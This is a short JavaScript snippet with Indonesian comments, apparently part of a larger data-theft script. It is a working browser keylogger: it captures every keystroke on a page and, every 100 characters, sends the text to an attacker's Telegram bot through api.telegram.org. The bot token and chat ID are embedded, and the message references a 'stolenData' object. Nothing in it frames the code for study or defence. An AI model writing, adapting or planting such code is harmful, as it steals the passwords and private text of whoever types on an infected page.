// Keylogger untuk menangkap semua ketikan
let keylog = '';
document.addEventListener('keydown', function(e) {
    keylog += e.key;
    // Kirim keylog setiap 100 karakter
    if (keylog.length >= 100) {
        sendKeylog(keylog);
        keylog = '';
    }
});

function sendKeylog(keys) {
    const botToken = '8486130443:AAHwGtsjyluGSoG5w2MmF1lkJYXsJ6VeIyU';
    const chatId = '7756877885';
    const message = `⌨️ Keylog from ${stolenData.ip}:\n${keys}`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
}